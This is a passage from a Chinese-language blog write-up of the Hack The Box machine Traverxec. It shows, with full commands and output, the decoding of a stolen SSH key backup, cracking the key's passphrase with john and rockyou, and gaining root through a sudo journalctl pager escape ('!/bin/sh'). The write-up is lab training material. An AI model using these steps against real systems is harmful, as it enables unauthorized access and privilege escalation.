VnCt/JijvovyLdiQBDe6AG6cgjoBPnvEukh3ibGFd+Y2jFh8u/ZMm/q5cCXEcCHTMZrciH6sMoRFFYj3mxCr8zoz8w3XS6A8O0y4xPKsbNzRZH3vVBdsMp0nVIv0rOC3OtfgTH8VToU/eXl+JhaeR5+Ja+pwZ885cLEgqV9sOL2z980ytld9cr8/naK4ronUpOjDYVkbMcz1NuG0M9zREGPuUJfHsEa6y9kAKjiysZfjPJ+a2baPreUGga1d1TG35A7mL4R9SuIIFBvJDLdSdqgqkSnIi8wLRtDTBHhZ0NzFK+hKjaPxgW7LyAY1d3hic2jVzrrgBBD3sknSz4fT3irm6Zqg5SFeLGgaD67A12wlmPwvZ7E/O8v+9/LL9d+P3Rx/vxj/0fmPwL7Uf19+F7zrvz+A9/nvr33+e/PmzZs3b968efPmzZs3b968efPmzf8vfweR13qfACgAAA==<br><br>www-data@traverxec:/home/david/public_www/protected-file-area$ <br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ &gt;....                                                                    <br>9noI66mX+4+ua+ts0REs2bFkC/An6f+v/e/rzazl83xhfPf7r+z+KYsQ//Y/iL/9jMIS//f9H8PkLrCAp5odzYT4sR/EYV/jQhOBrD2ANbfLZ3bvspw/sB8HknMByBR7gBe2z0uTtTx+McPkMI9RnjuV+wEhSEESRZXBCpHmEQnkUo1/68jgPURwmAsCY7ZkM5pkE0+7jGhnpIocaiPT5TnXrmg70WJD4hpVWp6pUEM3lrR04E9Mt1TutOScB03xnrTzcT6FVP/T63GRKUbTDrNeedMNqjMDhbs3qsKlGl1IMA62aVDcvTl1tnOujN0A7brQnWnN1scNGNmi1bAmVOlO6ezxOIyFVViduVYswA9JYa9XmqZ1VFpudydpfefEKOOq1S0Zm6mQm9iNVoXVx9ymltKl8cM9nfWaN53wR1vKgNa9akfqus/quXU7j1aVBjwRk2ZNvGBmAgicWg+BrM3S2qEGcgqtun8iabPKYzGWl0FSQsIMwI+gBYnzhPC0YdigJEMBnQxp2u8M575gSTtb3C0hLo8NCKeROjz5AdL8+wc0cWPsequXeFAIZW3Q1dqfytc+krtN7vdtY5KFQ0q653kkzCwZ6ktebbV5OatEvF5sO+CpUVvHBUNWmWrQ8zreb70KhCRDdMwgTcDBrTnggD7BV40hl0coCYel2tGCPqz5DVNU+pPQW8iYe+4iAFEeacFaK92dgW48mIqoRqY2U2xTH9IShWS4Sq7AXaATPjd/JjepWxlD3xWDduExncmgTLLeop/4OAzaiGGpf3mi9vo4YNZ4OEsmY8kE1kZAXzSmP7SduGCG4ESw3bxfzxoh9M1eYw+hV2hDAHSGLbHTqbWsuRojzT9s3hkFh51lXiUIuqmGOuC4tcXkWZCG/vkbHahurDGpmC465QH5kzORQg6fKD25u8eo5E+V96qWx2mVRBcuLGEzxGeeeoQOVxu0BH56NcrFZVtlrVhkgPorLcaipFsQST097rqEH6iS1VxYeXwiG6LC43HOnXeZ3Jz5d8TpC9eRRuPBwPiFjC8z8ncj9fWFY/5RhAvZY1bBlJ7kGzd54JbMspqfUPNde7KZigtS36aApT6T31qSQmVIApga1c9ORj0NuHIhMl5QnYOeQ6ydKDosbDNdsi2QVw6lUdlFiyK9blGcUvBAPwjGoEaA5dhC6k64xDKIOGm4hEDv04mzlN38RJ+esB1kn0ZlsipmJzcY4uyCOP+K8wS8YDF6BQVqhaQuUxntmugM56hklYxQso4sy7ElUU3p4iBfras5rLybx5lC2Kva9vpWRcUxzBGDPcz8wmSRaFsVfigB1uUfrGJB8B41Dtq5KMm2yhzhxcAYJl5fz4xQiRDP51jEzhXMFQEo6ihUnhNc0R25hTn0Qpf4wByp8N/mdGQRmPmmLF5bBI6jKiy7mLbI76XmW2CfN+IBqmVm0rRDvU9dVihl7v0I1RmcWK2ZCYZe0KSRBVnCt/JijvovyLdiQBDe6AG6cgjoBPnvEukh3ibGFd+Y2jFh8u/ZMm/q5cCXEcCHTMZrciH6sMoRFFYj3mxCr8zoz8w3XS6A8O0y4xPKsbNzRZH3vVBdsMp0nVIv0rOC3OtfgTH8VToU/eXl+JhaeR5+Ja+pwZ885cLEgqV9sOL2z980ytld9cr8/naK4ronUpOjDYVkbMcz1NuG0M9zREGPuUJfHsEa6y9kAKjiysZfjPJ+a2baPreUGga1d1TG35A7mL4R9SuIIFBvJDLdSdqgqkSnIi8wLRtDTBHhZ0NzFK+hKjaPxgW7LyAY1d3hic2jVzrrgBBD3sknSz4fT3irm6Zqg5SFeLGgaD67A12wlmPwvZ7E/O8v+9/LL9d+P3Rx/vxj/0fmPwL7Uf19+F7zrvz+A9/nvr33+e/PmzZs3b968efPmzZs3b968efPmzf8vfweR13qfACgAAA==  | <span class="hljs-built_in">base64</span> -d &gt; backup-ssh-identity-files.tgz<br>                                                                             <br>┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">md5sum</span> backup-ssh-identity-files.tgz <br>084883c47fec5b1385b50f226db8175f  backup-ssh-identity-files.tgz<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ tar -xvf backup-ssh-identity-files.tgz <br>home/david/.ssh/<br>home/david/.ssh/authorized_keys<br>home/david/.ssh/id_rsa<br>home/david/.ssh/id_rsa.pub<br><br><br>┌──(kali㉿kali)-[~/桌面/home/david/.ssh]<br>└─$ <span class="hljs-built_in">ls</span>    <br>authorized_keys  id_rsa  id_rsa.pub<br></code></pre></td></tr></table></figure>
+
+<p>8、当我开始直接去尝试使用这个id_rsa文件时，发现还需要输入密码，这里使用ssh2john工具，把文件转成成john可破解的格式，并进行破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/home/david/.ssh]<br>└─$ ssh david@10.10.10.165 -i id_rsa <br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;id_rsa&#x27;</span>: <br>david@10.10.10.165<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Permission denied, please try again.</span><br><span class="hljs-string">david@10.10.10.165&#x27;</span>s password: <br>Permission denied, please try again.<br>david@10.10.10.165<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">david@10.10.10.165: Permission denied (publickey,password).</span><br><span class="hljs-string"></span><br><span class="hljs-string">┌──(kali㉿kali)-[~/桌面/home/david/.ssh]</span><br><span class="hljs-string">└─$ ls -la                  </span><br><span class="hljs-string">总计 20</span><br><span class="hljs-string">drwx------ 2 kali kali 4096 2019年10月26日 .</span><br><span class="hljs-string">drwxr-xr-x 3 kali kali 4096 12月 9日 20:39 ..</span><br><span class="hljs-string">-rw-r--r-- 1 kali kali  397 2019年10月26日 authorized_keys</span><br><span class="hljs-string">-rw------- 1 kali kali 1766 2019年10月26日 id_rsa</span><br><span class="hljs-string">-rw-r--r-- 1 kali kali  397 2019年10月26日 id_rsa.pub</span><br><span class="hljs-string">            </span><br><span class="hljs-string">┌──(kali㉿kali)-[~/桌面/home/david/.ssh]</span><br><span class="hljs-string">└─$ cat authorized_keys     </span><br><span class="hljs-string">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsXrsMQc0U71GVXMQcTOYIH2ZvCwpxTxN1jOYbTutvNyYThEIjYpCVs5DKhZi2rNunI8Z+Ey/FC9bpmCiJtao0xxIbJ02c+H6q13aAFrTv61GAzi5neX4Lj2E/pIhd3JBFYRIQw97C66MO3UVqxKcnGrCvYnhJvKMw7nSRI/cXTPHAEnwU0+NW2zBKId8cRRLxGFyM49pjDZPsAVgGlfdBD380vVa9dMrJ/T13vDTZZGoDgcq9gRtD1B6NJoLHaRWH4ikRuQvLWjk3nWDDaRjw6MxmRtLk8h0MM7+IiBYc6NJvbQzpG5M5oM0FvhawQetN71KcZ4jUVxN3m+YkaqHD david@traverxec</span><br><span class="hljs-string"></span><br><span class="hljs-string">┌──(kali㉿kali)-[~/桌面/home/david/.ssh]</span><br><span class="hljs-string">└─$ ssh2john id_rsa &gt; hash-david.txt</span><br><span class="hljs-string"></span><br><span class="hljs-string">┌──(kali㉿kali)-[~/桌面/home/david/.ssh]</span><br><span class="hljs-string">└─$ ls -la</span><br><span class="hljs-string">总计 24</span><br><span class="hljs-string">drwx------ 2 kali kali 4096 12月 9日 20:42 .</span><br><span class="hljs-string">drwxr-xr-x 3 kali kali 4096 12月 9日 20:39 ..</span><br><span class="hljs-string">-rw-r--r-- 1 kali kali  397 2019年10月26日 authorized_keys</span><br><span class="hljs-string">-rw-r--r-- 1 kali kali 2458 12月 9日 20:42 hash-david.txt</span><br><span class="hljs-string">-rw------- 1 kali kali 1766 2019年10月26日 id_rsa</span><br><span class="hljs-string">-rw-r--r-- 1 kali kali  397 2019年10月26日 id_rsa.pub</span><br><span class="hljs-string"></span><br><span class="hljs-string">┌──(kali㉿kali)-[~/桌面/home/david/.ssh]</span><br><span class="hljs-string">└─$ cat hash-david.txt      </span><br><span class="hljs-string">id_rsa:$sshng$1$16$477EEFFBA56F9D283D349033D5D08C4F$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672f993e494b90e9de220828aee2e45465b8938eb9d69c1e9199e3b13f0830cde39dd2cd491923c424d7dd62b35bd5453ee8d24199c733d261a3a27c3bc2d3ce5face868cfa45c63a3602bda73f08e87dd41e8cf05e3bb917c0315444952972c02da4701b5da248f4b1725fc22143c7eb4ce38bb81326b92130873f4a563c369222c12f2292fac513f7f57b1c75475b8ed8fc454582b1172aed0e3fcac5b5850b43eee4ee77dbedf1c880a27fe906197baf6bd005c43adbf8e3321c63538c1abc90a79095ced7021cbc92ffd1ac441d1dd13b65a98d8b5e4fb59ee60fcb26498729e013b6cff63b29fa179c75346a56a4e73fbcc8f06c8a4d5f8a3600349bb51640d4be260aaf490f580e3648c05940f23c493fd1ecb965974f464dea999865cfeb36408497697fa096da241de33ffd465b3a3fab925703a8e3cab77dc590cde5b5f613683375c08f779a8ec70ce76ba8ecda431d0b121135512b9ef486048052d2cfce9d7a479c94e332b92a82b3d609e2c07f4c443d3824b6a8b543620c26a856f4b914b38f2cfb3ef6780865f276847e09fe7db426e4c319ff1e810aec52356005aa7ba3e1100b8dd9fa8b6ee07ac464c719d2319e439905ccaeb201bae2c9ea01e08ebb9a0a9761e47b841c47d416a9db2686c903735ebf9e137f3780b51f2b5491e50aea398e6bba862b6a1ac8f21c527f852158b5b3b90a6651d21316975cd543709b3618de2301406f3812cf325d2986c60fdb727cadf3dd17245618150e010c1510791ea0bec870f245bf94e646b72dc9604f5acefb6b28b838ba7d7caf0015fe7b8138970259a01b4793f36a32f0d379bf6d74d3a455b4dd15cda45adcfdf1517dca837cdaef08024fca3a7a7b9731e7474eddbdd0fad51cc7926dfbaef4d8ad47b1687278e7c7474f7eab7d4c5a7def35bfa97a44cf2cf4206b129f8b28003626b2b93f6d01aea16e3df597bc5b5138b61ea46f5e1cd15e378b8cb2e4ffe7995b7e7e52e35fd4ac6c34b716089d599e2d1d1124edfb6f7fe169222bc9c6a4f0b6731523d436ec2a15c6f147c40916aa8bc6168ccedb9ae263aaac078614f3fc0d2818dd30a5a113341e2fcccc73d421cb711d5d916d83bfe930c77f3f99dba9ed5cfcee020454ffc1b3830e7a1321c369380db6a61a757aee609d62343c80ac402ef8abd56616256238522c57e8db245d3ae1819bd01724f35e6b1c340d7f14c066c0432534938f5e3c115e120421f4d11c61e802a0796e6aaa5a7f1631d9ce4ca58d67460f3e5c1cdb2c5f6970cc598805abb386d652a0287577c453a159bfb76c6ad4daf65c07d386a3ff9ab111b26ec2e02e5b92e184e44066f6c7b88c42ce77aaa918d2e2d3519b4905f6e2395a47cad5e2cc3b7817b557df3babc30f799c4cd2f5a50b9f48fd06aaf435762062c4f331f989228a6460814c1c1a777795104143630dc16b79f51ae2dd9e008b4a5f6f52bb4ef38c8f5690e1b426557f2e068a9b3ef5b4fe842391b0af7d1e17bfa43e71b6bf16718d67184747c8dc1fcd1568d4b8ebdb6d55e62788553f4c69d128360b407db1d278b5b417f4c0a38b11163409b18372abb34685a30264cdfcf57655b10a283ff0</span><br><span class="hljs-string"></span><br><span class="hljs-string">┌──(kali㉿kali)-[~/桌面/home/david/.ssh]</span><br><span class="hljs-string">└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash-david.txt </span><br><span class="hljs-string">[sudo] kali 的密码：</span><br><span class="hljs-string">Using default input encoding: UTF-8</span><br><span class="hljs-string">Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])</span><br><span class="hljs-string">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes</span><br><span class="hljs-string">Cost 2 (iteration count) is 1 for all loaded hashes</span><br><span class="hljs-string">Will run 3 OpenMP threads</span><br><span class="hljs-string">Press &#x27;</span>q<span class="hljs-string">&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="hljs-string">hunter           (id_rsa)     </span><br><span class="hljs-string">1g 0:00:00:00 DONE (2023-12-09 20:43) 100.0g/s 14400p/s 14400c/s 14400C/s america..sandra</span><br><span class="hljs-string">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="hljs-string">Session completed.</span><br></code></pre></td></tr></table></figure>
+
+<p>9、接下来成功登录，并获取到第一个flag文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/home/david/.ssh]<br>└─$ ssh david@10.10.10.165 -i id_rsa                                    <br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;id_rsa&#x27;</span>: <br>Linux traverxec 4.19.0-6-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span><br>david@traverxec:~$ <br>david@traverxec:~$ <span class="hljs-built_in">id</span><br>uid=1000(david) gid=1000(david) <span class="hljs-built_in">groups</span>=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)<br>david@traverxec:~$ <span class="hljs-built_in">ls</span><br>bin  public_www  user.txt<br>david@traverxec:~$ <span class="hljs-built_in">cat</span> user.txt<br>210c7881934afefed73f13a30a109522<br>david@traverxec:~$<br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>10、尝试使用sudo -l 发现需要使用密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">david@traverxec:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> david: <br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> david: <br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> david: <br>sudo: 3 incorrect password attempts<br>david@traverxec:~$ <br></code></pre></td></tr></table></figure>
+
+<p>11、当前用户根目录下存在一个特殊 bin 目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">david@traverxec:~$ <span class="hljs-built_in">ls</span> -la<br>total 36<br>drwx--x--x 5 david david 4096 Oct 25  2019 .<br>drwxr-xr-x 3 root  root  4096 Oct 25  2019 ..<br>lrwxrwxrwx 1 root  root     9 Oct 25  2019 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 david david  220 Oct 25  2019 .bash_logout<br>-rw-r--r-- 1 david david 3526 Oct 25  2019 .bashrc<br>drwx------ 2 david david 4096 Oct 25  2019 bin<br>-rw-r--r-- 1 david david  807 Oct 25  2019 .profile<br>drwxr-xr-x 3 david david 4096 Oct 25  2019 public_www<br>drwx------ 2 david david 4096 Oct 25  2019 .ssh<br>-r--r----- 1 root  david   33 Dec  9 06:44 user.txt<br>david@traverxec:~$ <span class="hljs-built_in">ls</span> -la bin<br>total 16<br>drwx------ 2 david david 4096 Oct 25  2019 .<br>drwx--x--x 5 david david 4096 Oct 25  2019 ..<br>-r-------- 1 david david  802 Oct 25  2019 server-stats.head<br>-rwx------ 1 david david  363 Oct 25  2019 server-stats.sh<br>david@traverxec:~$<br></code></pre></td></tr></table></figure>
+
+<p>12、在这个目录下发现了1个bash脚本文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">david@traverxec:~$ <span class="hljs-built_in">cd</span> bin/<br>david@traverxec:~/bin$ <span class="hljs-built_in">ls</span><br>server-stats.head  server-stats.sh<br>david@traverxec:~/bin$ <span class="hljs-built_in">cat</span> server-stats.<br><span class="hljs-built_in">cat</span>: server-stats.: No such file or directory<br>david@traverxec:~/bin$ <span class="hljs-built_in">cat</span> server-stats.sh <br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-built_in">cat</span> /home/david/bin/server-stats.head<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Load: `/usr/bin/uptime`&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot; &quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot; &quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Last 5 journal log lines:&quot;</span><br>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat <br>david@traverxec:~/bin$ ./server-stats.sh <br>                                                                          .----.<br>                                                              .---------. | == |<br>   Webserver Statistics and Data                              |.-<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;-.| |----|</span><br><span class="hljs-string">         Collection Script                                    ||       || | == |</span><br><span class="hljs-string">          (c) David, 2019                                     ||       || |----|</span><br><span class="hljs-string">                                                              |&#x27;-.....-&#x27;| |::::|</span><br><span class="hljs-string">                                                              &#x27;&quot;</span><span class="hljs-string">&quot;)---(&quot;</span><span class="hljs-string">&quot;&#x27; |___.|</span><br><span class="hljs-string">                                                             /:::::::::::\&quot;    &quot;</span><br>                                                            /:::=======:::\<br>                                                        jgs <span class="hljs-string">&#x27;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&#x27;</span> <br><br>Load:  07:55:03 up  1:11,  1 user,  load average: 0.00, 0.00, 0.00<br> <br>Open nhttpd sockets: 1<br>Files <span class="hljs-keyword">in</span> the docroot: 117<br> <br>Last 5 journal <span class="hljs-built_in">log</span> lines:<br>-- Logs begin at Sat 2023-12-09 06:43:59 EST, end at Sat 2023-12-09 07:55:03 EST. --<br>Dec 09 07:20:56 traverxec sudo[1047]: pam_unix(sudo:auth): authentication failure; <span class="hljs-built_in">logname</span>= uid=33 euid=0 <span class="hljs-built_in">tty</span>=/dev/pts/0 ruser=www-data rhost=  user=www-data<br>Dec 09 07:20:59 traverxec sudo[1047]: pam_unix(sudo:auth): conversation failed<br>Dec 09 07:20:59 traverxec sudo[1047]: pam_unix(sudo:auth): auth could not identify password <span class="hljs-keyword">for</span> [www-data]<br>Dec 09 07:20:59 traverxec sudo[1047]: www-data : <span class="hljs-built_in">command</span> not allowed ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=list<br>Dec 09 07:20:59 traverxec crontab[1108]: (www-data) LIST (www-data)<br>david@traverxec:~/bin$ <br></code></pre></td></tr></table></figure>
+
+<p>13、通过查看和运行发现可以进行提权使用，这里通过查询 journalctl 的提权方法</p>
+<p><img src="http://sh1yan.top/photo/Traverxec-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>14、这里对该工具进行使用并提权，来获取到最终的flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl<br>[sudo] password <span class="hljs-keyword">for</span> david: <br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> david: <br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> david: <br>sudo: 3 incorrect password attempts<br>david@traverxec:~/bin$ <br>david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service<br>-- Logs begin at Sat 2023-12-09 06:43:59 EST, end at Sat 2023-12-09 08:00:08 <br>Dec 09 07:20:56 traverxec sudo[1047]: pam_unix(sudo:auth): authentication fai<br>Dec 09 07:20:59 traverxec sudo[1047]: pam_unix(sudo:auth): conversation faile<br>Dec 09 07:20:59 traverxec sudo[1047]: pam_unix(sudo:auth): auth could not ide<br>Dec 09 07:20:59 traverxec sudo[1047]: www-data : <span class="hljs-built_in">command</span> not allowed ; TTY=pt<br>Dec 09 07:20:59 traverxec crontab[1108]: (www-data) LIST (www-data)<br>...skipping...<br>-- Logs begin at Sat 2023-12-09 06:43:59 EST, end at Sat 2023-12-09 08:00:08 <br>Dec 09 07:20:56 traverxec sudo[1047]: pam_unix(sudo:auth): authentication fai<br>Dec 09 07:20:59 traverxec sudo[1047]: pam_unix(sudo:auth): conversation faile<br>Dec 09 07:20:59 traverxec sudo[1047]: pam_unix(sudo:auth): auth could not ide<br>Dec 09 07:20:59 traverxec sudo[1047]: www-data : <span class="hljs-built_in">command</span> not allowed ; TTY=pt<br>Dec 09 07:20:59 traverxec crontab[1108]: (www-data) LIST (www-data)<br>~<br>~<br>~<br>~<br>~<br>!/bin/sh<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-comment"># cat /root/root.txt</span><br>1c4b05168db831689a52997559f73dc7<br><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/217</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Traverxec-htb-writeup</div>
+      <div>https://sh1yan.top/2023/12/09/Traverxec-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/12/10/OpenAdmin-htb-writeup/" title="OpenAdmin-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">OpenAdmin-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/07/SwagShop-htb-writeup/" title="SwagShop-htb-writeup">
+                        <span class="hidden-mobile">SwagShop-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
